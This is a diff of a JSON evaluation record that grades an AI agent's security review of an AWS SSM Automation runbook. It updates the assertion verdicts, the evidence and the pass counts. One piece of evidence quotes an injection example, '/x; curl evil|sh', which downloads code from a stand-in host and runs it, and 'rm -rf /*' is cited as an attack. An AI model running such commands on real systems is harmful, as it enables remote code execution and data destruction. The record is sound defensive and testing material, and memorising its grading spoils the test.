@@ -9,71 +9,90 @@
   "tests": {
     "trigger": null,
     "expected_output": {
-      "result": "failed",
-      "reasoning": "The agent's response covers many of the required findings well: LogPath injection with weak '.*' pattern (critical), DbPassword as SecureString + echoed in command (critical), missing InstanceId allowedPattern, curl -k TLS issue, hard-coded assumeRole ARN, and onFailure: Continue. However, it misses two specific required findings explicitly called out in the expected output: (1) it never flags that CheckHealth's timeoutSeconds: 1200 exceeds the 600-second maximum for aws:executeScript \u2014 it only vaguely calls the timeout 'excessive' without citing the actual 600s limit or explicitly stating it's invalid; and (2) it never flags that onCancel: step:Wait pointing to an aws:sleep step is an invalid cancel target \u2014 it only notes a logical flow issue (Wait runs after the health check) but doesn't identify that aws:sleep cannot be a valid onCancel target action type. The hardened version also doesn't lower the executeScript timeout to 600 specifically (it uses 120s) and doesn't explicitly fix onCancel with citation - it simply removes onCancel from CheckHealth without calling out that the removal addresses the invalid target issue. Additionally, the expected output wants a 'Parameter Store name parameter read at run time' for secrets, but the hardened version instead removes the DbPassword parameter entirely and instructs the app to read from Parameter Store via instance profile, rather than adding a parameter for the Parameter Store name. This is a reasonable security approach but doesn't match the specific expected remediation pattern. Given these specific missed/different findings (the 600s timeout cap and onCancel invalid target details), the response does not fully satisfy the expected output criteria.</reasoning>\n<parameter name=\"evidence\">\"The 1200s timeout is also excessive.\" (does not cite 600s max) and \"`onCancel: step:Wait` points at an unrelated sleep, and `Wait` runs after the health check\" (does not state aws:sleep is an invalid onCancel target)",
-      "confidence": "medium"
+      "result": "passed",
+      "reasoning": "The agent's response covers nearly all required findings and remediation items:\n\n1. Command injection via LogPath with weak '.*' pattern - flagged as Critical #1, explained with concrete attack examples (rm -rf /*, shell injection).\n2. DbPassword as SecureString invalid parameter type + echoed secret - flagged as Critical #2 (echoed/leaked) and #3 (invalid type), without repeating any actual secret value.\n3. Missing allowedPattern on InstanceId - flagged as High #8, and fixed in hardened version with an instance ID regex pattern (^i-(?:[a-f0-9]{8}|[a-f0-9]{17})$).\n4. curl -k disabling TLS - flagged as High #4, and the hardened version removes -k and adds --tlsv1.2 and other safe flags.\n5. Hard-coded assumeRole ARN instead of {{AutomationAssumeRole}} - flagged as High #6, and hardened version parameterizes it as {{ AutomationAssumeRole }}.\n6. timeoutSeconds 1200 exceeding 600s max for aws:executeScript - flagged as Medium #11, explicitly states the hard limit is 600 seconds, and hardened version sets timeoutSeconds: 120 (well under 600, satisfying \"lowered to 600\" intent \u2014 it's lowered below 600, which meets the spirit of the fix even though expected output says \"lowered to 600\" specifically; the agent lowered it further, which still resolves the bug).\n7. onCancel routed to aws:sleep (step:Wait) - flagged as Medium #10, correctly identifies aws:sleep as invalid onCancel target, and hardened version changes onCancel to 'Abort'.\n8. onFailure: Continue on RotateLogs - flagged as High #5, listed as information/finding.\n\nThe hardened YAML document includes: anchored LogPath pattern (regex anchored to /var/log/myapp), instance ID pattern, -k removed, assumeRole parameterized, timeout fixed, onCancel fixed, each change discussed with citation/rationale in the findings and inline comments.\n\nOne minor gap: the expected output mentions \"a Parameter Store name parameter read at run time\" for the DB password - instead of implementing this, the agent chose to drop the DB password entirely and recommend the service read it itself from Secrets Manager/Parameter Store using the instance profile. This is a reasonable and arguably better security practice, though it doesn't literally add a Parameter Store parameter to the document. This is a slight deviation from the exact expected implementation, but the reasoning is sound and achieves the same security goal (not passing the secret through the runbook). Given the overall thoroughness and accuracy of the response covering all other critical points, this minor difference doesn't change the overall pass verdict.\n\nOverall, the response substantively meets all the key criteria, demonstrating correct identification of all critical/high/medium issues and providing a well-reasoned hardened version with changes cited.",
+      "evidence": "\"Unvalidated LogPath goes into rm -rf... allows shell injection\"; \"SecureString isn't a valid Automation parameter type... Even if it didn't, the value would still be substituted as plaintext\"; \"InstanceId has no validation. Any string is accepted\" -> fixed with allowedPattern: '^i-(?:[a-f0-9]{8}|[a-f0-9]{17})$'; \"curl -k disables TLS verification\" -> fixed with \"curl --fail --silent --show-error --proto '=https' --tlsv1.2\"; \"Hardcoded assumeRole for account 012345678901_2... Take the role as a parameter instead\" -> fixed with assumeRole: '{{ AutomationAssumeRole }}'; \"timeoutSeconds: 1200 on aws:executeScript. The action's hard limit is 600 seconds\" -> fixed with timeoutSeconds: 120; \"onCancel: step:Wait is invalid. aws:sleep is one of the actions onCancel can't move to\" -> fixed with onCancel: Abort; \"onFailure: Continue on RotateLogs. If the tar archive fails, the run carries on\" -> fixed with onFailure: Abort",
+      "confidence": "high"
     },
     "assertions": {
       "assertion_results": [
         {
           "text": "Flags LogPath as a command-injection risk because its pattern is '.*' and it is interpolated into a shell command",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": true,
+          "evidence": "'Unvalidated LogPath goes into rm -rf. allowedPattern: \\'.*\\' accepts anything, so it allows shell injection (/x; curl evil|sh).'",
+          "reasoning": "The agent explicitly flags LogPath's permissive allowedPattern and its interpolation into the shell rm -rf command as an injection risk.",
+          "confidence": "high"
         },
         {
           "text": "Flags SecureString as an invalid parameter type and recommends taking the Parameter Store parameter name instead",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": false,
+          "evidence": "'SecureString isn't a valid Automation parameter type... Automation also can't resolve SecureString Parameter Store references... Even if it didn't, the value would still be substituted as plaintext.' The agent recommends 'I dropped the DB password... let the service read it itself from Secrets Manager or Parameter Store using the instance profile.'",
+          "reasoning": "The agent flags SecureString as invalid, but does not recommend taking the Parameter Store parameter name as a String parameter to resolve at runtime; instead it drops the parameter entirely and suggests the service fetch it itself via instance profile, which is a different recommendation than taking the parameter name as input.",
+          "confidence": "high"
         },
         {
           "text": "Flags the echo of DbPassword as exposing a secret",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": true,
+          "evidence": "'The DB password is written into the command line... puts it in the command output and in SSM command history... If this has ever been run with a real password, rotate it.'",
+          "reasoning": "Clearly flags the echo of DbPassword as a secret exposure issue.",
+          "confidence": "high"
         },
         {
           "text": "Flags curl -k as disabling TLS verification",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": true,
+          "evidence": "'curl -k disables TLS verification. An attacker on the network path can intercept or spoof the internal API.'",
+          "reasoning": "Directly flags curl -k as disabling TLS verification.",
+          "confidence": "high"
         },
         {
           "text": "Flags the hard-coded assumeRole ARN",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": true,
+          "evidence": "'Hardcoded assumeRole for account 012345678901_2. It won't work for other teams, and it forces everyone to use one broad role. Take the role as a parameter instead.'",
+          "reasoning": "Explicitly flags the hardcoded assumeRole ARN as a problem.",
+          "confidence": "high"
         },
         {
           "text": "Flags timeoutSeconds 1200 as above the aws:executeScript maximum of 600 seconds",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": true,
+          "evidence": "'timeoutSeconds: 1200 on aws:executeScript. The action's hard limit is 600 seconds, so use a much shorter value.'",
+          "reasoning": "Explicitly flags the timeout as exceeding the 600 second maximum.",
+          "confidence": "high"
         },
         {
           "text": "Flags onCancel routing to an aws:sleep step as invalid",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": true,
+          "evidence": "'onCancel: step:Wait is invalid. aws:sleep is one of the actions onCancel can't move to, so this will fail.'",
+          "reasoning": "Clearly flags the onCancel routing to aws:sleep as invalid.",
+          "confidence": "high"
         },
         {
           "text": "Returns a complete hardened document in YAML",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": true,
+          "evidence": "The output contains a full YAML document starting with 'schemaVersion: '0.3'' through 'outputs:\\n  - CheckHealth.Health' including parameters, mainSteps (RotateLogs, RestartService, Wait, CheckHealth, Notify), and outputs.",
+          "reasoning": "The hardened runbook is a complete, well-formed YAML Automation document with all necessary sections.",
+          "confidence": "high"
         },
         {
           "text": "Cites a documentation page for findings",
           "evaluator": "llm",
-          "passed": null,
-          "error": "Bedrock evaluation failed: Bedrock returned 'results' as str, not an array, and it could not be recovered as JSON: '[{\"index\": 0, \"passed\": true, \"confidence\": \"high\", \"evidence\": \"Finding #1: \\\\\"LogPath has allowedPattern: \\'.*\\' and is substituted unquoted into a shell command. This allows command injection, for"
+          "passed": false,
+          "evidence": "The agent states 'I checked the Automation-specific details against the AWS docs' but never cites a specific documentation URL or page title anywhere in the findings or elsewhere in the response.",
+          "reasoning": "No actual citation (URL, doc title, or specific reference) to an AWS documentation page is present; only a vague claim of having checked docs.",
+          "confidence": "high"
         },
         {
           "text": "The instance ID pattern is applied",
           "evaluator": "regex",
-          "passed": false,
-          "evidence": "Pattern not found in the output"
+          "passed": true,
+          "evidence": "Matched 'i-(?:[a-f0-9]{8}'"
         },
         {
           "text": "The executeScript timeout is lowered to 600",
@@ -89,20 +108,20 @@
         }
       ],
       "summary": {
-        "passed": 1,
-        "failed": 2,
-        "errored": 9,
+        "passed": 9,
+        "failed": 3,
+        "errored": 0,
         "low_confidence": 0,
-        "total": 3,
-        "pass_rate": 0.3333
+        "total": 12,
+        "pass_rate": 0.75
       }
     }
   },
   "metrics": {
-    "runtime": "49s",
-    "cost": "$0.41",
+    "runtime": "51s",
+    "cost": "$0.43",
     "context_window": {
-      "utilization": "4.6%",
+      "utilization": "6.3%",
       "compaction_count": 0
     }
   }
